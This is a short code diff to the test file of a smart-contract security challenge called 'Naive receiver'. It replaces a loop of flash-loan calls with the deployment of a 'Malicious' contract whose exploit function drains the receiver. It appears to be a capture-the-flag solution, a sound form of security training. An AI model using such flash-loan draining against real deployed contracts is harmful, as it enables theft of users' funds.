@@ -30,9 +30,9 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        for (i = 0; i < 10; ++i) {
-        await this.pool.connect(attacker).flashLoan(this.receiver.address, 1);
-        }
+        const MaliciousFactory = await ethers.getContractFactory('Malicious', attacker);
+        this.malicious = await MaliciousFactory.deploy();
+        this.malicious.connect(attacker).exploit(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
